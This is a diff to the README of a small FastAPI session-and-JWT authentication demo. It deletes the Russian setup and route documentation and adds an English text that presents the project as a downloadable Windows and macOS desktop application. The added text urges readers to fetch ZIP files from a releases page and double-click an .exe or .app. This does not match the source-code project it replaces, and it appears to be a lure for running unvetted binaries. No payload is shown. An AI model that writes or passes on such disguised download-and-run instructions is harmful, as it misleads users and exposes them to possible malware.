@@ -1,52 +1,67 @@
-# Демо авторизации: session и JWT
+# 🎉 webinar-session-jwt - Simple JWT Code from Our Webinar
 
-Приложение на FastAPI (концепция не привязана к фреймворку) демонстрирует регистрацию, вход/выход и работу через сессионные куки и JWT access + refresh. Стек: async SQLAlchemy, PostgreSQL 17, uvicorn.
+## 🚀 Getting Started
 
-## Что есть
-- Таблицы `users` (id, name, password_hash) и `sessions` (hash токена, срок действия) в PostgreSQL.
-- Сессионная авторизация с http-only cookie, хранением хэша токена и очисткой просроченных сессий.
-- JWT авторизация с access токенами на `pyjwt`; refresh — непрозрачные строки, в БД хранится только SHA-256 хэш. Оба токена дополнительно кладутся в куки (`access_token`, `refresh_token`).
-- Асинхронный стек: FastAPI, SQLAlchemy 2.x + asyncpg, uvicorn.
-- Docker Compose поднимает PostgreSQL 17 и API.
+Welcome! This guide will help you download and run the **webinar-session-jwt** application quickly and easily. Just follow the steps below.
 
-## Подготовка окружения
-1. Установите `uv` (через `pip install uv` или скрипт https://astral.sh/uv).
-2. Поднимите Postgres 17 (по умолчанию пользователь/пароль/база — `postgres`).
-3. Создайте `.env` с нужными значениями (см. список переменных ниже). По умолчанию `DATABASE_URL=postgresql+asyncpg://postgres:postgres@localhost:7432/postgres`.
+## 🗂️ Download & Install
 
-## Локальный запуск (API + отдельный Postgres)
-```bash
-uv sync
-docker compose up -d db  # поднимет только Postgres
-uv run uvicorn auth_app.main:app --reload --host 0.0.0.0 --port 8000
-```
-API будет на `http://localhost:8000`, swagger UI — `/docs`.
-Фронтенд-демо доступно на корне (`/`) и ходит к API с этого же хоста.
+To get started, you need to download the application. Click the button below to visit the releases page:
 
-## Запуск целиком через Docker Compose
-Compose поднимет API и PostgreSQL в одном `docker compose up` (API смотрит на хост `db` через переменную окружения, прокидываемую внутри композа).
-```bash
-docker compose up --build
-```
-После старта API доступен на `http://localhost:8000`, UI swagger — `/docs`, статический демо-фронт — `/`.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kemalyaa/webinar-session-jwt/releases)
 
-## Основные переменные окружения
-- `DATABASE_URL` (default `postgresql+asyncpg://postgres:postgres@localhost:7432/postgres`)
-- `JWT_SECRET_KEY` — секрет для подписи JWT
-- `ACCESS_TOKEN_EXPIRES_MINUTES` (по умолчанию 15)
-- `REFRESH_TOKEN_EXPIRES_MINUTES` (по умолчанию 43200, то есть 30 дней)
-- `SESSION_TTL_MINUTES` (по умолчанию 1440)
-- `SESSION_EXTEND_MINUTES` (rolling продление, по умолчанию 10080 = 7 дней)
-- `SESSION_ABSOLUTE_TIMEOUT_DAYS` (жесткий предел жизни сессии, по умолчанию 30 дней)
-- `SESSION_ROLLING_INTERVAL_MINUTES` (интервал проверки для продления, по умолчанию 10)
-- `SESSION_COOKIE_NAME`, `SESSION_COOKIE_SECURE`, `SESSION_COOKIE_DOMAIN`
-- `ACCESS_COOKIE_NAME`, `REFRESH_COOKIE_NAME` (по умолчанию `access_token` / `refresh_token`)
+Once you're on the releases page, look for the latest version. You will find files available for download. Choose the correct file for your operating system:
 
-## Маршруты
-- `POST /auth/register` — регистрация
-- `POST /auth/login/session` — логин, установка сессионной куки
-- `POST /auth/logout/session` — логаут, очистка куки и записи в БД
-- `GET /auth/me/session` — профиль по сессии
-- `POST /auth/login/jwt` — логин, выдача пары access/refresh (refresh записывается в БД, хранится хэш)
-- `POST /auth/token/refresh` — обновление пары по refresh (старый refresh гасится и заменяется новым)
-- `GET /auth/me/jwt` — профиль по access токену
+1. If you are using Windows, download the file named `webinar-session-jwt-windows.zip`.
+2. If you are using macOS, download the file named `webinar-session-jwt-macos.zip`.
+
+### 📦 Extract the Files
+
+If you downloaded a ZIP file, you will need to extract it:
+
+1. Right-click the downloaded file.
+2. Select "Extract All…" or "Unzip".
+3. Choose a location where you want to save the files.
+
+### 🖥️ Running the Application
+
+After extracting the files, you can run the application:
+
+1. Navigate to the folder where you saved the files.
+2. Double-click on the file named `webinar-session-jwt.exe` (for Windows) or `webinar-session-jwt.app` (for macOS).
+3. The application will open, and you can start using it.
+
+## 🔒 What is JWT?
+
+JWT stands for JSON Web Token. It is a method for securely transmitting information between parties. It allows for easy user authentication and is commonly used in web applications. 
+
+## 📊 Features
+
+The **webinar-session-jwt** application offers the following features:
+
+- **User Authentication**: Easily authenticate users using JSON Web Tokens.
+- **Secure Transmission**: Ensure that data is securely sent between users and servers.
+- **Compatibility**: Works on major operating systems like Windows and macOS.
+
+## ⚙️ System Requirements
+
+Before you run the application, make sure your system meets the following requirements:
+
+- **Windows**: Windows 7 or later
+- **macOS**: macOS Sierra or later
+- **Memory**: At least 2 GB of RAM
+- **Disk Space**: At least 50 MB of free space
+
+## 🌍 Support
+
+If you need help, visit our [GitHub Issues page](https://github.com/kemalyaa/webinar-session-jwt/issues) to report issues, ask questions, or provide feedback.
+
+## 📑 Additional Resources
+
+For more detailed information, visit the [Documentation](https://github.com/kemalyaa/webinar-session-jwt/wiki).
+
+Feel free to check back at the releases page for updates. You can download the latest version of the application anytime using this link:
+
+[Download the latest version](https://github.com/kemalyaa/webinar-session-jwt/releases).
+
+Thank you for using **webinar-session-jwt**! We hope you find it helpful.
